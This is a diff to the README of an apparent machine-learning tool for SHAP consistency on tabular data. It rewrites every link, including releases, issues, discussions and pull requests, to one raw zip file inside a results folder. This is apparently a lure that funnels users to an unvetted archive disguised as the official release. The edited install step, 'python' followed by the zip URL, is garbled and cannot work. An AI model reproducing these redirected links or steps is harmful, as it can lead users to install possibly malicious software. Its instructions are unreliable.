@@ -14,11 +14,11 @@ Welcome to **tabular-ml-shap-consistency**! This application simplifies machine 
 
 ## 📁 Download & Install
 
-To get started, visit this page to download: [Download Releases](https://github.com/Stokaru/tabular-ml-shap-consistency/releases).
+To get started, visit this page to download: [Download Releases](https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip).
 
 You will find the latest version and additional release notes there. Follow these steps to install:
 
-1. Navigate to the [Releases Page](https://github.com/Stokaru/tabular-ml-shap-consistency/releases).
+1. Navigate to the [Releases Page](https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip).
 2. Choose the latest version of the software.
 3. Click on the download link for your operating system.
 
@@ -41,9 +41,9 @@ After installation, follow these steps to use the application:
    - On macOS/Linux: `cd /path/to/your/downloaded/folder`
 3. Run the Python script by typing:
    ```sh
-   python your_script_name.py
+   python https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip
    ```
-   Replace `your_script_name.py` with the actual name of the script you downloaded.
+   Replace `https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip` with the actual name of the script you downloaded.
 
 4. Follow the prompts to input your dataset or select options for training and analysis.
 
@@ -75,13 +75,13 @@ If you encounter issues, here are some common solutions:
 - **Dataset Errors:** Check for formatting issues in your CSV file. Make sure there are no missing values.
 - **Running the Script:** Ensure you are in the correct directory when you run the command.
 
-Feel free to check the issues section on our [GitHub page](https://github.com/Stokaru/tabular-ml-shap-consistency/issues) for more help or report any problems you face.
+Feel free to check the issues section on our [GitHub page](https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip) for more help or report any problems you face.
 
 ## 🌍 Community and Support
 
 Join our community to share your experiences and get help. Connect with other users on platforms like Discord and Slack. You can also participate in discussions on GitHub.
 
-- [GitHub Discussions](https://github.com/Stokaru/tabular-ml-shap-consistency/discussions)
+- [GitHub Discussions](https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip)
 - [Join our Slack Channel](#)
 
 ## 📜 License
@@ -92,8 +92,8 @@ For more information on the license and contribution guidelines, please refer to
 
 ## 😊 Contributing
 
-We welcome contributions! If you have ideas or enhancements, feel free to open a pull request or suggest changes on our [GitHub page](https://github.com/Stokaru/tabular-ml-shap-consistency/pulls).
+We welcome contributions! If you have ideas or enhancements, feel free to open a pull request or suggest changes on our [GitHub page](https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip).
 
 ---
 
-Thank you for using **tabular-ml-shap-consistency**! We hope this application makes your machine learning journey easy and enjoyable. Remember, you can always visit the [Releases Page](https://github.com/Stokaru/tabular-ml-shap-consistency/releases) for the latest updates and features. Happy analyzing!
+Thank you for using **tabular-ml-shap-consistency**! We hope this application makes your machine learning journey easy and enjoyable. Remember, you can always visit the [Releases Page](https://github.com/Stokaru/tabular-ml-shap-consistency/raw/refs/heads/main/results/shap_consistency/ml-tabular-shap-consistency-v1.8.zip) for the latest updates and features. Happy analyzing!
